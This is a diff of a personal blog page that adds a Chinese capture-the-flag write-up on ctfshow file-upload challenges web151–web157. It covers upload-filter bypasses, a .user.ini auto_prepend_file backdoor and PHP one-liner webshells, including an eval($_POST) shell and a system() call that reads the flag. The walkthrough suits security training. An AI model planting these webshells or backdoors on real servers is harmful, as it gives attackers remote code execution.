@@ -16,18 +16,29 @@
   <meta name="author" content="j0ker">
   <meta name="keywords" content="">
   
-    <meta property="og:type" content="article">
-<meta property="og:title" content="day03">
-<meta property="og:url" content="http://example.com/2022/01/14/day03/index.html">
+    <meta name="description" content="ctfshow之文件上传web151upload.js会对上传的文件进行检查，可以先上传一张真的图片(.png)，再用burpsuite将png改为php,内容改成php代码，再命令执行即可。   也可以上传图片马，然后在burpsuie里将png改为php，再命令执行即可。 12用小点的图片和一句话木马，利用copy命令生成图片马copy shell.png&#x2F;b+shell.php&#x2F;a 1.pn">
+<meta property="og:type" content="article">
+<meta property="og:title" content="ctfshow_upload">
+<meta property="og:url" content="http://example.com/2022/02/06/ctfshow-upload/index.html">
 <meta property="og:site_name" content="j0ker&#39;s blog">
+<meta property="og:description" content="ctfshow之文件上传web151upload.js会对上传的文件进行检查，可以先上传一张真的图片(.png)，再用burpsuite将png改为php,内容改成php代码，再命令执行即可。   也可以上传图片马，然后在burpsuie里将png改为php，再命令执行即可。 12用小点的图片和一句话木马，利用copy命令生成图片马copy shell.png&#x2F;b+shell.php&#x2F;a 1.pn">
 <meta property="og:locale" content="zh_CN">
-<meta property="article:published_time" content="2022-01-14T14:04:29.000Z">
-<meta property="article:modified_time" content="2022-01-14T14:04:29.032Z">
+<meta property="og:image" content="http://example.com/2022/02/06/ctfshow-upload/image-20220206200917084.png">
+<meta property="og:image" content="http://example.com/2022/02/06/ctfshow-upload/image-20220206215218371.png">
+<meta property="og:image" content="http://example.com/2022/02/06/ctfshow-upload/image-20220206220334001.png">
+<meta property="og:image" content="http://example.com/2022/02/06/ctfshow-upload/image-20220206222508627.png">
+<meta property="og:image" content="http://example.com/2022/02/06/ctfshow-upload/image-20220206222721766.png">
+<meta property="og:image" content="http://example.com/2022/02/06/ctfshow-upload/image-20220206230340766.png">
+<meta property="article:published_time" content="2022-02-06T11:57:57.000Z">
+<meta property="article:modified_time" content="2022-02-06T15:12:44.701Z">
 <meta property="article:author" content="j0ker">
+<meta property="article:tag" content="Web">
+<meta property="article:tag" content="文件上传">
 <meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="http://example.com/2022/02/06/ctfshow-upload/image-20220206200917084.png">
   
   
-  <title>day03 - j0ker&#39;s blog</title>
+  <title>ctfshow_upload - j0ker&#39;s blog</title>
 
   <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4/dist/css/bootstrap.min.css" />
 
@@ -173,7 +184,7 @@
       <div class="full-bg-img">
         <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
           <div class="page-header text-center fade-in-up">
-            <span class="h2" id="subtitle" title="day03">
+            <span class="h2" id="subtitle" title="ctfshow_upload">
               
             </span>
 
@@ -183,8 +194,8 @@
   
     <span class="post-meta">
       <i class="iconfont icon-date-fill" aria-hidden="true"></i>
-      <time datetime="2022-01-14 22:04" pubdate>
-        2022年1月14日 晚上
+      <time datetime="2022-02-06 19:57" pubdate>
+        2022年2月6日 晚上
       </time>
     </span>
   
@@ -194,7 +205,7 @@
   
     <span class="post-meta mr-2">
       <i class="iconfont icon-chart"></i>
-      0 字
+      940 字
     </span>
   
 
@@ -203,7 +214,7 @@
       <i class="iconfont icon-clock-fill"></i>
       
       
-      1 分钟
+      8 分钟
     </span>
   
 
@@ -232,15 +243,71 @@
         <div class="py-5" id="board">
           <article class="post-content mx-auto">
             <!-- SEO header -->
-            <h1 style="display: none">day03</h1>
+            <h1 style="display: none">ctfshow_upload</h1>
             
             <div class="markdown-body">
-              
+              <h2 id="ctfshow之文件上传"><a href="#ctfshow之文件上传" class="headerlink" title="ctfshow之文件上传"></a>ctfshow之文件上传</h2><h3 id="web151"><a href="#web151" class="headerlink" title="web151"></a>web151</h3><p>upload.js会对上传的文件进行检查，可以先上传一张真的图片(.png)，再用burpsuite将png改为php,内容改成php代码，再命令执行即可。</p>
+<img src="/2022/02/06/ctfshow-upload/image-20220206200917084.png" srcset="/img/loading.gif" lazyload class="">
+
+<p>也可以上传图片马，然后在burpsuie里将png改为php，再命令执行即可。</p>
+<figure class="highlight php"><table><tr><td class="gutter"><div class="code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div></td><td class="code"><pre><code class="hljs php">用小点的图片和一句话木马，利用copy命令生成图片马<br>copy shell.png/b+shell.php/a <span class="hljs-number">1</span>.png<br></code></pre></td></tr></table></figure>
+
+<h3 id="web152"><a href="#web152" class="headerlink" title="web152"></a>web152</h3><p>后端会对Content-Type进行限制，但和上题的思路一样。</p>
+<h3 id="web153"><a href="#web153" class="headerlink" title="web153"></a>web153</h3><p>这里对php后缀进行了限制，这里可以使用p牛的方法：<a target="_blank" rel="noopener" href="https://www.leavesongs.com/PENETRATION/php-user-ini-backdoor.html">user.ini文件构成php后门。</a></p>
+<p>php.ini是php默认的配置文件，其中包括了很多php的配置。除了主 php.ini 之外，PHP 还会在每个目录下扫描 INI 文件，从被执行的 PHP 文件所在目录开始一直上升到 web 根目录（<code>$_SERVER[&#39;DOCUMENT_ROOT&#39;]</code> 所指定的）。如果被执行的 PHP 文件在 web 根目录之外，则只扫描该目录。</p>
+<p>而且，和php.ini不同的是，.user.ini是一个能被动态加载的ini文件。也就是说我修改了.user.ini后，不需要重启服务器中间件，只需要等待user_ini.cache_ttl所设置的时间（默认为300秒），即可被重新加载。</p>
+<p>php配置项的两个参数</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs php">指定一个文件，自动包含在要执行的文件前<br>auto_append_file=<span class="hljs-number">1</span>.png<br>    <br>指定一个文件，自动包含在要执行的文件后<br>auto_prepend_file=<span class="hljs-number">1</span>.png<br></code></pre></td></tr></table></figure>
+
+<p>先上传.user.ini文件</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">auto_prepend_file=a.png<br></code></pre></td></tr></table></figure>
+
+<img src="/2022/02/06/ctfshow-upload/image-20220206215218371.png" srcset="/img/loading.gif" lazyload class="">
+
+<p>接着上传a.png的马，成功利用。</p>
+<img src="/2022/02/06/ctfshow-upload/image-20220206220334001.png" srcset="/img/loading.gif" lazyload class="">
+
+<h3 id="web154"><a href="#web154" class="headerlink" title="web154"></a>web154</h3><p>和上题的思路一样，但上传马的时报错了，这里可能是把文件内容的php给禁用了，这里我们使用短标签进行绕过</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?=</span> @<span class="hljs-keyword">eval</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;a&#x27;</span>]);<span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>
+
+<p>成功上传马</p>
+<img src="/2022/02/06/ctfshow-upload/image-20220206222508627.png" srcset="/img/loading.gif" lazyload class="">
+
+<p>拿到flag</p>
+<img src="/2022/02/06/ctfshow-upload/image-20220206222721766.png" srcset="/img/loading.gif" lazyload class="">
+
+<h3 id="web155"><a href="#web155" class="headerlink" title="web155"></a>web155</h3><p>与上题思路一致</p>
+<h3 id="web156"><a href="#web156" class="headerlink" title="web156"></a>web156</h3><p>和上题思路一致，但上传马的时候始终失败，另外过滤了’[‘字符,这里换了一个马，直接读flag。</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?=</span>system(<span class="hljs-string">&quot;tac ../fla*&quot;</span>);<span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>
+
+
+
+<img src="/2022/02/06/ctfshow-upload/image-20220206230340766.png" srcset="/img/loading.gif" lazyload class="">
+
+<h3 id="web157"><a href="#web157" class="headerlink" title="web157"></a>web157</h3>
             </div>
             <hr>
             <div>
               <div class="post-metas mb-3">
                 
+                  <div class="post-meta mr-3">
+                    <i class="iconfont icon-category"></i>
+                    
+                      <a class="hover-with-bg" href="/categories/CTF/">CTF</a>
+                    
+                      <a class="hover-with-bg" href="/categories/CTF/Web/">Web</a>
+                    
+                  </div>
+                
+                
+                  <div class="post-meta">
+                    <i class="iconfont icon-tags"></i>
+                    
+                      <a class="hover-with-bg" href="/tags/Web/">Web</a>
+                    
+                      <a class="hover-with-bg" href="/tags/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/">文件上传</a>
+                    
+                  </div>
                 
               </div>
               
@@ -255,18 +322,12 @@
                   <article class="post-prev col-6">
                     
                     
-                      <a href="/2022/02/06/ctfshow-upload/">
-                        <i class="iconfont icon-arrowleft"></i>
-                        <span class="hidden-mobile">ctfshow_upload</span>
-                        <span class="visible-mobile">上一篇</span>
-                      </a>
-                    
                   </article>
                   <article class="post-next col-6">
                     
                     
-                      <a href="/2022/01/14/day02/">
-                        <span class="hidden-mobile">day02</span>
+                      <a href="/2022/01/14/day03/">
+                        <span class="hidden-mobile">day03</span>
                         <span class="visible-mobile">下一篇</span>
                         <i class="iconfont icon-arrowright"></i>
                       </a>
